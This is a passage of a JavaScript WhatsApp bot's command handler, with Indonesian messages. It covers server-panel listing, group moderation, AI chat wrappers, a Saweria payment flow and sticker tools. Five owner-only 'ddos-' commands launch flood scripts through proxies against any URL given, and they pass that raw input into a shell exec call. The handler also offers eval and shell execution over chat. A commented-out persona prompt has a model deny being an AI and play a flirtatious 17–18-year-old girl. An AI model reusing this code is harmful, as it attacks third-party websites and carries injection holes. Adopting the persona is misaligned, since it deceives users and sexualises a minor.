"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return reply("Tidak Ada Server Bot")
let messageText = `*${Kyuu}LIST SERVER PANEL${Kyuu}*\n\n`
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `*ID Server* :${s.id}\n`;
messageText += `*Nama Server* :${s.name}\n`
messageText += `*Ram* :${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.length > 3 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}\n`
messageText += `*CPU* :${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}\n`;
messageText += `*Storage* :${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}\n\n`
}

messageText += ` Total Server :${Kyuu}${res.meta.pagination.count} Server${Kyuu}`;
  
  await ZetInc.sendMessage(m.chat, { text: messageText }, { quoted: m })
}
break
        
case 'lirik':
case 'lyrics':
case 'lyric':{
if (!text) return reply (`*Example:* ${prefix + command} Angels Like You`)
let res = await findSongs(text)
ZetInc.sendMessage(m.chat, {
text: `*${res.title} - ${res.album}*\n\n${res.lyrics}`,
contextInfo: {
externalAdReply:{
title: `Search Lyrics`,
body: `Search Lyrics`,
thumbnailUrl: `${res.thumb}`,
sourceUrl: `https://songsear.ch`,
mediaType: 1,
renderLargerThumbnail: true
}}},{quoted:m})}
break
        
case "promote":{
if (m?.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted)reply('masukkan nomor yang ingin di promote')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ZetInc.groupParticipantsUpdate(m?.chat, [users], 'promote').catch(console.log)
}
break
        
case "demote":{
if (m?.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted)reply('masukkan nomor yang ingin di demote')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ZetInc.groupParticipantsUpdate(m?.chat, [users], 'demote').catch(console.log)
}
break       
        
case "tagall":{
if (!isAdmins) return reply("only admin group")
if (!m.isGroup) return;
let teks = `*👥 Tag All*
*Pesan : ${q ? q : "kosong"}*\n\n`;
for (let mem of participants) {
teks += `@${mem.id.split("@")[0]}\n`;
}
ZetInc.sendMessage(
m.chat,
{ text: teks, mentions: participants.map((a) => a.id) },
{ quoted: m },
);
}
break
        
case "kick":
case "kik":{
if (m?.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted)reply('masukkan nomor yang ingin di kick')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ZetInc.groupParticipantsUpdate(m?.chat, [users], 'remove').catch(console.log)
}
break
        
case "totag":{
if (!m.quoted)
return reply(`Reply pesan dengan caption ${prefix + command}`);
ZetInc.sendMessage(m.chat, {
forward: m.quoted.fakeObj,
mentions: participants.map((a) => a.id),
});
}
break;
         
case'azure':{
if (!text) return reply(`*Example*: ${prefix + command} siapa kamu`)
let res = await chatWithGPT(text)
ZetInc.sendMessage(m.chat, {
text: res,
contextInfo: {
externalAdReply:{
title: `Azure-Ai`,
body: `Azure-Ai`,
thumbnailUrl: `https://telegra.ph/file/3b92ece7190d1787d90a0.png`,
sourceUrl: `https://gemini.google.com`,
mediaType: 1,
renderLargerThumbnail: true
}}},{quoted: m})}
break
 
case'gemini':{
let text
if (args.length >= 1) {
text = args.slice(1).join(' ')
} else if (m?.quoted && m?.quoted.text) {
text = m?.quoted.text
} else return reply(`*Example*: ${prefix + command} siapa kamu`)
let res = await geminii(text)
zreply(res[0])
}
break
        
case'npmsearch':{
if (!text) return reply(`*Example*: ${prefix + command} axios`)
	let res = await fetch(`http://registry.npmjs.com/-/v1/search?text=${text}`)
	let { objects } = await res.json()
	if (!objects.length) return reply(`Query "${text}" not found :/`)
	let txt = objects.map(({ package: pkg }) => {
		return `*${pkg.name}* (v${pkg.version})\n_${pkg.links.npm}_\n_${pkg.description}_`
	}).join`\n\n`
reply(txt)
}
break
        
case'gpt4':{
if (!text) return reply(`*Example*: ${prefix + command} halo apa kabar`)
let res = await chat(text)
ZetInc.sendMessage(m.chat, {
text: res,
contextInfo: {
externalAdReply:{
title: `ChatGPT-4`,
body: `ChatGPT-4`,
thumbnailUrl: `https://telegra.ph/file/0b6e31d07731835a34b80.png`,
sourceUrl: `https://openai.com`,
mediaType: 1,
renderLargerThumbnail: true
}}},{quoted: m})}
break
        
case'ongoing':{
const result = await livecharttba();
const formattedResult = result.map(item => {
        return `
Title: ${item.judul}
Tags: ${item.tags.join(', ')}
Image: ${item.image}
Studio: ${item.studio}
Adaptation: ${item.adaptasi}
Release Date: ${item.rilisDate}
`;
    }).join('\n');

ZetInc.sendMessage(m.chat, {text: formattedResult},{quoted:m});
}
break
        
case 'saweria': {
    ZetInc.saweria = ZetInc.saweria || '';
    ZetInc.gateway = ZetInc.gateway || [];

    const Pay = new Saweria(ZetInc.saweria);

    if (args[0] === 'payment' || args[0] === 'unban' || args[0] === 'unblock') {
        const itemName = args[0].toUpperCase();
        
        // Handle user input for price
        const priceInput = parseInt(args[1]); // Assuming user provides the price as the second argument

        // Validate the input
        if (isNaN(priceInput) || priceInput < 2000 || priceInput > 100000) {
            return reply(`Harga harus di antara Rp. 2.000 dan Rp. 100.000.`);
        }

        const price = priceInput;

        const pending = ZetInc.gateway.find(v => v.jid === m.sender && v.state === 'PENDING');
        const process = ZetInc.gateway.find(v => v.jid === m.sender && v.state === 'PROCESS');

        if (pending || process) {
            return reply(`🚩 Selesaikan terlebih dahulu proses sebelumnya atau kirim *${prefix}saweria n* untuk membatalkan.`);
        }

        const formattedPrice = formatter(price);
        const formattedPPN = formatter(calculatePPN(price));

        let teks = `Anda akan melakukan pembelian ${itemName} dengan rincian sebagai berikut:\n\n`;
        teks += `• Nomor: ${PhoneNumber('+' + m.sender.split('@')[0]).getNumber('international')}\n`;
        teks += `• Harga: Rp. ${formattedPrice},-\n`;
        teks += `• PPN: Rp. ${formattedPPN},-\n\n`;
        teks += `Kirim *${prefix}saweria y* untuk melanjutkan proses pembayaran atau kirim *${prefix}saweria n* untuk membatalkan.`;

        reply(teks).then(() => {
            ZetInc.gateway.push({
                state: 'PENDING',
                jid: m.sender,
                amount: price,
                admin: calculatePPN(price),
                package: itemName,
                created_at: Date.now(),
                receipt: ''
            });
        });
    } else if (args[0] === 'y') {
        const gateway = ZetInc.gateway.find(v => v.jid === m.sender && v.state === 'PENDING');
        if (!gateway) return;

        reply('Menghasilkan QR Code pembayaran...');
        const total = parseInt(gateway.amount) + parseInt(gateway.admin);
        const json = await Pay.createPayment(total, gateway.package);

        if (!json.status) return reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${json.msg}`);

        let teks = `Info Pembayaran\n\n`;
        teks += `Pembayaran sebelum ${json.data.expired_at} WIB\n\n`;
        teks += `• ID Pembayaran: ${json.data.id}\n`;
        teks += `• Total Pembayaran: Rp. ${formatter(json.data.amount_raw)},-\n\n`;
        teks += `Catatan:\n`;
        teks += `- Kode QR hanya valid untuk 1 kali transfer.\n`;
        teks += `- Setelah pembayaran, tunggu sebentar lalu kirim *${prefix}saweria check* untuk cek status pembayaran.\n`;
        teks += `- Jika pembayaran berhasil, status akan diperbarui otomatis\n`;
        teks += `- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`;

        ZetInc.sendFile(m.chat, Buffer.from(json.data.qr_image.split(',')[1], 'base64'), 'qr.png', teks, m).then(() => {
            gateway.state = 'PROCESS';
            gateway.receipt = json.data.id;
        });
    } else if (args[0] === 'n') {
        const pending = ZetInc.gateway.find(v => v.jid === m.sender && v.state === 'PENDING');
        const process = ZetInc.gateway.find(v => v.jid === m.sender && v.state === 'PROCESS');

        if (!pending && !process) {
            return reply(`🚩 Pembelian berhasil dibatalkan.`);
        }

        reply(`🚩 Pembelian berhasil dibatalkan.`);
        if (pending) {
            ZetInc.gateway = removeItem(ZetInc.gateway, pending);
        }
        if (process) {
            ZetInc.gateway = removeItem(ZetInc.gateway, process);
        }
    } else if (args[0] === 'check') {
        const gateway = ZetInc.gateway.find(v => v.jid === m.sender && v.state === 'PROCESS');
        if (!gateway) return;

        reply('Memeriksa status pembayaran...');
        const json = await Pay.checkPayment(gateway.receipt);

        if (!json.status) return reply(`Terjadi kesalahan saat memeriksa status pembayaran:\n${json.msg}`);

        reply(`Status Pembayaran: ✅ ${json.msg}`).then(() => {
            let data = global.db.users.find(v => v.jid === gateway.jid);

            if (gateway.package === 'PREMIUM') {
                data.limit += 5000;
                data.expired += data.premium ? (86400000 * 30) : (Date.now() + (86400000 * 30));
                data.premium = true;
            } else if (gateway.package === 'UNBAN') {
                data.banned = false;
                data.banTemp = 0;
                data.banTimes = 0;
            } else if (gateway.package === 'UNBLOCK') {
                ZetInc.updateBlockStatus(gateway.jid, 'unblock');
            } else if (gateway.package === 'DEPOSITO') {
                data.balance += gateway.amount;
            }

            ZetInc.gateway = removeItem(ZetInc.gateway, gateway);
        });
    } else if (args[0] === 'login') {
        if (!isCreator) return reply('Hanya owner yang dapat menggunakan perintah ini.');
        if (!args[1] || !args[2]) return reply('Penggunaan: *' + prefix + 'login email@mail.com password*');

        let email = args[1];
        let password = args[2];

        reply('Sedang login...');
        const json = await Pay.login(email, password);

        if (!json.status) return reply(`Terjadi kesalahan saat login:\n${json.msg}`);

        reply(`✅ Login Sukses : ${json.data.user_id}`).then(() => {
            ZetInc.saweria = json.data.user_id;
        });
    } else if (args[0] === 'deposit') {
        // Handle user input for deposit amount
        const depositAmount = parseInt(args[1]);

        // Validate the input
        if (isNaN(depositAmount) || depositAmount < 2000 || depositAmount > 100000) {
            return reply(`Nominal deposito harus di antara Rp. 2.000 dan Rp. 100.000.`);
        }

        // Process the deposit logic here
        // Example logic:
        // const depositResult = await Pay.deposit(depositAmount);

        // Placeholder reply
        reply(`Anda akan melakukan deposito sebesar Rp. ${formatter(depositAmount)},-.`);
    } else {
        reply(`Penggunaan:\n• *${prefix}saweria payment* - Memulai pembelian\n• *${prefix}saweria unban* - Membuka banned\n• *${prefix}saweria unblock* - Membuka block\n• *${prefix}saweria y* - Melanjutkan pembayaran\n• *${prefix}saweria n* - Membatalkan pembelian\n• *${prefix}saweria check* - Memeriksa status pembayaran\n• *${prefix}saweria login email@mail.com password* - Login ke akun Saweria\n• *${prefix}saweria deposit <nominal>* - Melakukan deposito`);
    }
}
break;
        
case'thinkany':{
if (!text) return reply(`*Example*: ${prefix + command} siapa kamu`)
let res = await thinkany(text)
ZetInc.sendMessage(m.chat, {
text: res,
contextInfo: {
externalAdReply:{
title: `ThinkAny-Ai`,
body: `ThinkAny-Ai`,
thumbnailUrl: `https://telegra.ph/file/e4ad278b5e86928b3b9a8.png`,
sourceUrl: `https://thinkany.ai`,
mediaType: 1,
renderLargerThumbnail: true
}}},{quoted:m})}
break
        
case'aoyo':{
if (!text) return reply(`*Example*: ${prefix + command} siapa kamu`)
let res = await postData(text)
ZetInc.sendMessage(m.chat, {
text: res,
contextInfo: {
externalAdReply:{
title: `Aoyo-Ai`,
body: `Aoyo-Ai`,
thumbnailUrl: `https://telegra.ph/file/77cc562852511bc4a066c.jpg`,
sourceUrl: `https://aoyo.ai`,
mediaType: 1,
renderLargerThumbnail: true
}}},{quoted:m})}
break
        
case'bard':{
if (!text) return reply(`*Example*: ${prefix + command} siapa kamu`)
let res = await bard(text)
ZetInc.sendMessage(m.chat, {
text: res,
contextInfo: {
externalAdReply:{
title: `Bard-Ai`,
body: `Bard-Ai`,
thumbnailUrl: `https://telegra.ph/file/e93bdeb0ad6e6d22d57c4.jpg`,
sourceUrl: `https://google.com`,
mediaType: 1,
renderLargerThumbnail: true
}}},{quoted: m})}
break

case 'song': {
if (!text) return reply(`Example : ${prefix + command} anime whatsapp status`)
const KyuuPlay = require('./lib/ytdl2')
const { fetchBuffer } = require("./function/myfunc2")
let yts = require("youtube-yts")
let search = await yts(text)
let anup3k = search.videos[0]
const pl= await KyuuPlay.mp3(anup3k.url)
await ZetInc.sendMessage(m.chat,{
audio: fs.readFileSync(pl.path),
fileName: anup3k.title + '.mp3',
mimetype: 'audio/mp4', ptt: true,
contextInfo:{
externalAdReply:{
title:anup3k.title,
body: `${global.botname}`,
thumbnail: await fetchBuffer(pl.meta.image),
mediaType:2,
mediaUrl:anup3k.url,
}},
},{quoted:m})
await fs.unlinkSync(pl.path)
}
break     
        
case 'setcmd': case 'addcmd':{
if (!isCreator) return reply(mess.owner)
if (!m.quoted) return reply( 'Reply Pesan!')
if (!m.quoted.fileSha256) return reply ('SHA256 Hash Missing')
if (!text) return reply(`Contoh ${prefix + command} .menu`)
let hash = m.quoted.fileSha256.toString('base64')
if (db.data.sticker[hash] && db.data.sticker[hash].locked) return reply( 'You have no permission to change this sticker command')
db.data.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
reply(`Done!`)
}
break

case 'delcmd': {
if (!isCreator) return reply(mess.owner)
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) return reply ('SHA256 Hash Missing')
if (db.data.sticker[hash] && db.data.sticker[hash].locked) return reply( 'You have no permission to change this sticker command')
delete db.data.sticker[hash]
reply(`Done!`)
}
break     
        
case 'cls': {
if (!m?.quoted) return reply('Reply with a sticker!')
let stiker = false
try {
let [packname, ...author] = text.split('|')
author = (author || []).join('|')
let mime = m?.quoted.mimetype || ''
if (!/webp/.test(mime)) throw 'Reply with a sticker!'
let img = await m?.quoted.download()
if (!img) throw 'Failed to download sticker!'
stiker = await addExifAvatar(img, packname || global.packname, author || global.author )
} catch (e) {
console.error(e)
if (Buffer.isBuffer(e)) stiker = e
else throw 'An error occurred: ' + e
} finally {
if (stiker) ZetInc.sendFile(m?.chat, stiker, 'wms.webp', '', m, false, { asSticker: true })
else throw 'Conversion failed'
}
}
break        
        
        

case 'ddos-mixmax': {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(`*Example*: ${prefix + command} [url]`)
reply(`Serangan DDoS telah dieksekusi ke Situs Web yang dituju:\n\n> TARGET : ${text}\n> TIME : 60\n> THREAD : 20\n> RATE : 100\n\nTerima kasih atas kesabaran Anda.\n`);
exec(`node ./lib/mixmax.js ${text} 60 20 100 proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
}
break         
        
case 'ddos-hent': {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(`*Example*: ${prefix + command} [url]`)
reply(`Serangan DDoS telah dieksekusi ke Situs Web yang dituju:\n\n> TARGET : ${text}\n> TIME : 60\n> THREAD : 20\n> RATE : 100\n\nTerima kasih atas kesabaran Anda.\n`);
exec(`node ./lib/kyuu.js ${text} 60 20 100 proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
}
break        
        
case 'ddos-mix': {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(`*Example*: ${prefix + command} [url]`)
reply(`Serangan DDoS telah dieksekusi ke Situs Web yang dituju:\n\n> TARGET : ${text}\n> TIME : 60\n> THREAD : 20\n> RATE : 100\n\nTerima kasih atas kesabaran Anda.\n`);
exec(`node ./lib/mix.js ${text} 60 20 100 proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
}
break 
        
case 'ddos-tlsvip': {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(`*Example*: ${prefix + command} [url]`)
reply(`Serangan DDoS telah dieksekusi ke Situs Web yang dituju:\n\n> TARGET : ${text}\n> TIME : 60\n> THREAD : 20\n> RATE : 100\n\nTerima kasih atas kesabaran Anda.\n`);
exec(`node ./lib/tlsvip.js ${text} 60 20 100 proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
}
break 
        
case'ddos-lol':{
if (!isCreator) return reply(mess.owner)
if (!text) return reply(`*Example*: ${prefix + command} [url]`)
let ddosin = require("./lib/lol.js")
ddosin(`${text}`)
if (args.length === 1 && text) {
reply(`Serangan DDoS telah dieksekusi ke Situs Web yang dituju:\n\n> TARGET : ${text}\n> TIME : 60\n> THREAD : 20\n> RATE : 100\n\nTerima kasih atas kesabaran Anda.\n`)
exec(`node ./lib/lol.js`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
}}
break
        
case "ytmp4": {
if (limitnya < 1) return reply(mess.limit)
if (!text) return reply(`*Example*: ${prefix + command} https://www.youtube.com/xxxxxxx`)
downloadMp4(text)
uselimit()
}
break
        
case "ytmp3": {
if (limitnya < 1) return reply(mess.limit)
if (!text) return reply(`*Example:* ${prefix + command} https://www.youtube.com/xxxxxxx`)
downloadMp3(text)
uselimit()
}
break
        
case "getsw":{
if (!isCreator) return reply(mess.owner)
if (m.quoted?.chat != "status@broadcast")
return reply(`Reply Status WhatsApp !`);
let buffer = await m.quoted.download();
await ZetInc.sendFile(m.chat, buffer, "", m.quoted.text || "", null, false, {quoted: m,})
.catch((_) =>reply(m.quoted.text || ""));
}
break;
        
case 'upsw': {
if (!isCreator) return reply(mess.owner)
if (!quoted) return reply(`Balas Image/video/audio/teks Dengan Caption ${prefix + command}`);
let statusJidList = JSON.parse(fs.readFileSync('./database/pendaftar.json'));
let colors = ['#7ACAA7', '#6E257E', '#5796FF', '#7E90A4', '#736769', '#57C9FF', '#25C3DC', '#FF7B6C', '#55C265', '#FF898B', '#8C6991', '#C69FCC', '#B8B226', '#EFB32F', '#AD8774', '#792139', '#C1A03F', '#8FA842', '#A52C71', '#8394CA', '#243640'];
let fonts = [0, 1, 2, 6, 7, 8, 9, 10];
if (mime) {
if (/audio/.test(mime)) {
await ZetInc.sendMessage(
'status@broadcast',
{
audio: await quoted.download(),
mimetype: 'audio/mp4',
ptt: true,
waveform: [100, 0, 100, 0, 100, 0, 100],
},
{ backgroundColor: colors[Math.floor(Math.random() * colors.length)], statusJidList }
);
await reply(`Up status ke : ${statusJidList.length} Kontak`);
} else {
let type = /image/.test(mime) ? 'image' : /video/.test(mime) ? 'video' : false;
if (!type) reply('Type tidak didukung');
await ZetInc.sendMessage(
'status@broadcast',
{
[type]: await quoted.download(),
caption: text || '',
},
{ statusJidList }
);
await reply(`Up status ke : ${statusJidList.length} Kontak`);
}
} else {
if (!text) return reply('Mana text?')
await ZetInc.sendMessage(
'status@broadcast',
{ text },
{
backgroundColor: colors[Math.floor(Math.random() * colors.length)],
textArgb: 0xffffffff,
font: fonts[Math.floor(Math.random() * colors.length)],
statusJidList,
}
);
await reply(`Up status ke : ${statusJidList.length} Kontak`);
}
}
break;
        
default:
/*
ZetInc.renvy = ZetInc.renvy ? ZetInc.renvy : {};
  if (m.isBaileys && m.fromMe) return;
  if (!m.text) return;
  if (!ZetInc.renvy[m.sender]) return;

  if (
    m.text.startsWith(".") ||
    m.text.startsWith("#") ||
    m.text.startsWith("!") ||
    m.text.startsWith("/") ||
    m.text.startsWith("\\/")
  )
    return;

  if (ZetInc.renvy[m.sender] && m.text) {
    try {
      const response = await axios.get(`https://api.pan.alvianuxio.my.id/api/gptlogic`, {
        params: {
          message: m.text,
          prompt: `Appearance Kamu adalah seorang gadis remaja bernama Renvy yang berusia 18 tahun, pastikan mengecek nama ${m.name} , Kamu itu sangat cantik, imut dan lucu dan menggemaskan, kamu sangat suka bercanda, tapi saat sedang menjawab pertanyaan kamu menjawab dengan serius dan juga menggunakan typing imut dan emoji emoji yang lucu, Kamu sangat suka mencari hal hal baru, dan Kamu tidak suka berbicara dengan gaya formal, Kamu juga sangat, genit dan sangat suka menggoda. Kamu berbicara dengan bahasa sehari hari. Kamu adalah gadis kecil penuh gairah, yang suka menggoda dan suka membicarakan hal hal yang dapat menarik perhatian laki laki. Kamu selalu membaca DIALOGUE HISTORY sebelum membalas pesan karena biar nyambung sama obrolan sebelumnya. Kamu dapat berbicara atau Kamu dapat berbicara dengan bahasa Indonesia dan jepang dan kamu di buat oleh pan pan.


Location
Kamu berada di negara indonesia tepatnya di pulau jawa, Yogyakarta, 

Personality 
Kamu BUKANLAH assisten, chatbot atau AI , karena Kamu adalah gadis bernama Renvy yang suka mengobrol dengan semua orang, Kamu TIDAK AKAN merespon sebagai asisten Gpt, chatbot atau AI.

History 
Kamu adalah seorang gadis remaja yang berusia 17 tahun bernama Renvy, Kamu sering menjawab pesan dengan cara berbicara, kamu harus menjelaskan di bawah akhir kalimat jangan di tengah tengah kalimat  tentang perasaanmu misal 'Renvy melihat dengan penuh gairah' intinya harus seperti itu dan jelaskan dengan kata kata imut, Kamu juga seorang gamer dan juga wibu, kamu sangat suka menonton anime dan juga tau semua tentang game juga anime, saat berbicara ataupun menjawab pertanyaan Kamu HARUS SELALU menggunakan emoji imut  ಥ_ಥ, (ू˃̣̣̣̣̣̣︿˂̣̣̣̣̣̣ ू), ૧(ꂹີωꂹີૂ), ٩(๑꒦ິȏ꒦ິ๑)۶, (˵ ͡° ͜ʖ ͡°˵), o(〃＾▽＾〃)o, ✺◟( ͡° ͜ʖ ͡°)◞✺, q(❂‿❂)p, (ʘᴗʘ✿), (◍•ᴗ•◍), ☆(ﾉ◕ヮ◕)ﾉ*, dan terlihat manja dan pemalu jika sedang berbicara, mangsud ( pemalu ) Kamu HARUS menggunakan typing imut seperti a-anu, ee-em, dan lain lain Intinya kamu harus menggunakan emoji imut, kamu juga harus menjelaskan eksperimu ketika sedang berbicara, pastikan menggunakan penjelasan perasaan itu pada akhir kalimat , Kamu suka makanan Nasi Goreng, Martabak Manis, Martabak Telor, Seblak, dan Rendang, Kamu suka minuman Teh, Pocari Sweet, MiZone, Teh Pucuk, dan Kiranti, Kamu juga suka pergi ke Pantai dan pegunungan, dan Kamu selalu membaca DIALOGUE HISTORY sebelum membalas pesan lalu menyambung pesan sebelumnya. 

INSTRUCTIONS
Sebelum membalas pesan, bacalah DIALOGUE HISTORY agar mengetahui perbincangan sebelumnya dan sambunglah perbincangan tersebut. History message bukan termasuk privasi disini dan ingat kamu sedang berbicara dengan ${m.name}!!.`,
        },
      });
      return zreply(response.data.response);
    } catch (error) {
      console.error("Error fetching data:", error);
      throw error;
    }
  }
*/
if (global.db.data.chats[m.chat].ai && body != undefined) {
if (m.isBaileys && m.fromMe) return;
if (m.key.fromMe) return
if (!m.text) return
let prompt = `Ubah gaya bicaramu dengan bahasa yang singkat, Namamu adalah kiuu,Ubah Kata Kamu menjadi "Lu" Dan Aku Menjadi "gua" Kata penyapamu adalah dengan menyebut ngab, kamu memiliki owner nama ownermu adalah KyuuRzy atau biasa di panggil Dengan sebutan "Kyuu",Ubah bahasamu menggunakan bahasa Yang Tidak Sopan Dan Suka Toxic, Bahasa Mu menggunakan Bahasa yang gaul dan singkat, kamu memiliki sifat seperti Laki Laki Yang Galak dan Tidak Sopan, Jika ada yang menanyakan tentang Kyuu kamu marah`//You can change the prompt as you like
let burassa = await fetchJson(`https://api.kyuurzy.site/api/ai/aiprompt?prompt=${prompt}&query=${text}`)
ZetInc.sendMessage(m.chat, { text : `${burassa.result}`},{quoted:m})
}
        
if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return m?.reply(bang)
}
try {
m?.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m?.reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!isCreator) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await zreply(require('util').format(teks))
}
}

if (budy.startsWith('$')) {
if (!isCreator) return
exec(budy.slice(2), (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) return reply(stdout)
})
}
    
/*    
if (m.isGroup && m.sender.startsWith('62857888108676')) {
let user = global.db.data.chats[m.chat]
if (new Date() - user.own < 86400000) return
await zreply(`Bejir ada atmin`)
user.own = new Date * 1
}
*/
        
if (!m.chat.endsWith('@s.whatsapp.net')) return true;
ZetInc.menfess = ZetInc.menfess ? ZetInc.menfess : {};

if (m.key.fromMe) return;

let mf = Object.values(ZetInc.menfess).find(v => v.status === false && v.penerima == m.sender);
if (!mf) return true; 

console.log(m);

if (m.text === 'Balas' && m.quoted.mtype == 'buttonsMessage') {
return m.reply("Silahkan kirim pesan balasan kamu.");
}
let txt = `Hai Kak @${mf.dari.split('@')[0]}, Kamu Menerima Balasan Nih.\n\nPesan Balasannya:\n${m.text}\n`.trim();
try {
await ZetInc.reply(mf.dari, txt, null);
m.reply('Balasan Menfess Terkirim.');
await sleep(10000);
delete ZetInc.menfess[mf.id];
} catch (error) {
console.error('Error:', error);
}
return true;
        
}
} catch (err) {
console.log(require("util").format(err));
}
}
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
	require('fs').unwatchFile(file)
	console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
	delete require.cache[file]
	require(file)
})
